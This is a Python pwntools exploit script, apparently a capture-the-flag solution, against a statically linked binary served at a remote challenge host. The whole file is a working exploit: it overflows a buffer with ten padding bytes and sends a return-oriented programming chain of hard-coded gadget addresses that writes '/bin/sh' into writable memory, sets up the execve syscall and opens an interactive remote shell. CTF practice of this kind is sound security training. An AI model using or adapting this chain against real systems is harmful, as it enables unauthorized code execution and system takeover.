from pwn import *

elf = context.binary = ELF('./static')
#p = process('./static')
#gdb.attach(p, 'b *vuln+32\ncontinue\n')
p = remote('static.chal.cyberjousting.com', 1350)

#Gadgets
pop_rdi = 0x0000000000401fe0
pop_rsi = 0x00000000004062d8
pop_rax_rdx_rbx = 0x000000000045e466
mov_rax_rdx_pop_rbx = 0x0000000000467180

syscall = 0x0000000000401194
writable_mem = 0x000000000049d000
ret = pop_rdi + 1

rop = p64(ret)
#Assigning rax writable memory address and rdx the string we want
rop += p64(pop_rax_rdx_rbx)
rop += p64(writable_mem) + b"/bin/sh\x00" + p64(0)

#Moving the string into writable memory for access
rop += p64(mov_rax_rdx_pop_rbx)
rop += p64(0)

#Rax to 0x3b, rdx to 0
rop += p64(pop_rax_rdx_rbx)
rop += p64(0x3b) + p64(0) + p64(0)

#rdi to our string and rsi to 0
rop += p64(pop_rdi)
rop += p64(writable_mem)
rop += p64(pop_rsi)
rop += p64(0)
rop += p64(syscall)

payload = b'A'*10 + rop
p.sendline(payload)
p.interactive()